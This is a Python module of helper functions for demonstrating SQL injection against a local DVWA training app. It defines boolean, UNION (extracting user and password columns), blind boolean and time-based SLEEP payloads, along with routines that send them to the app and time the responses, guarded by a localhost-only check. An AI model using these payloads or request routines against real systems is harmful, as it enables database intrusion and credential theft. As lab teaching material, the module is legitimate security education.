"""DVWA-only SQL injection demo helpers."""

from __future__ import annotations

import time  # Import time for blind time-based demo measurement.
from urllib.parse import urlparse  # Import urlparse for local target safety checks.

import requests  # Import requests for local DVWA interaction.


def require_local_dvwa_target(base_url: str) -> None:
    """Allow execution only for localhost loopback targets."""

    host = (urlparse(base_url).hostname or "").strip().lower()  # Extract normalized hostname from target URL.
    if host not in {"localhost", "127.0.0.1"}:  # Restrict to local loopback hosts for safety.
        raise ValueError("Safety check failed: target must be localhost or 127.0.0.1.")  # Raise explicit safety boundary error.


def _request_payload(base_url: str, payload: str) -> dict[str, str]:
    """Send one safe lab request with payload and return response metadata."""

    require_local_dvwa_target(base_url)  # Enforce local-lab boundary before request.
    target = f"{base_url.rstrip('/')}/vulnerabilities/sqli/"  # Build DVWA SQLi endpoint URL.
    response = requests.get(target, params={"id": payload, "Submit": "Submit"}, timeout=10)  # Send payload in controlled lab request.
    from bs4 import BeautifulSoup  # Import BeautifulSoup lazily so safety tests can run without optional dependency.

    soup = BeautifulSoup(response.text, "html.parser")  # Parse response HTML for text preview extraction.
    text_preview = " ".join(soup.get_text(" ", strip=True).split()[:40])  # Build concise response preview for console readability.
    return {"payload": payload, "status_code": str(response.status_code), "preview": text_preview}  # Return structured request/response summary.


def basic_payloads() -> list[str]:
    """Return basic SQLi payload examples for local lab testing."""

    return ["1' OR '1'='1", "1' -- "]  # Return basic boolean/auth bypass style payload examples.


def union_payloads() -> list[str]:
    """Return UNION-based SQLi payload examples for local lab testing."""

    return ["1' UNION SELECT user, password FROM users -- "]  # Return UNION projection payload sample.


def blind_boolean_payloads() -> list[str]:
    """Return blind boolean SQLi payload examples for local lab testing."""

    return ["1' AND 1=1 -- ", "1' AND 1=2 -- "]  # Return true/false pair for response-difference observation.


def blind_time_payloads() -> list[str]:
    """Return blind time-based SQLi payload examples for local lab testing."""

    return ["1' OR SLEEP(2) -- "]  # Return one time-delay payload for response-time observation.


def run_demo(base_url: str, payloads: list[str]) -> list[dict[str, str]]:
    """Run a sequence of payloads and collect response metadata."""

    results: list[dict[str, str]] = []  # Initialize output list for per-payload results.
    for payload in payloads:  # Iterate through payload sequence.
        results.append(_request_payload(base_url, payload))  # Execute payload request and collect summary.
    return results  # Return collected demo results.


def run_time_demo(base_url: str, payload: str) -> dict[str, str]:
    """Run time-based payload and report elapsed time."""

    start = time.perf_counter()  # Capture high-resolution start timestamp.
    result = _request_payload(base_url, payload)  # Execute controlled payload request.
    elapsed = time.perf_counter() - start  # Compute elapsed duration in seconds.
    result["elapsed_seconds"] = f"{elapsed:.3f}"  # Attach rounded elapsed time to result payload.
    return result  # Return response summary including timing signal.
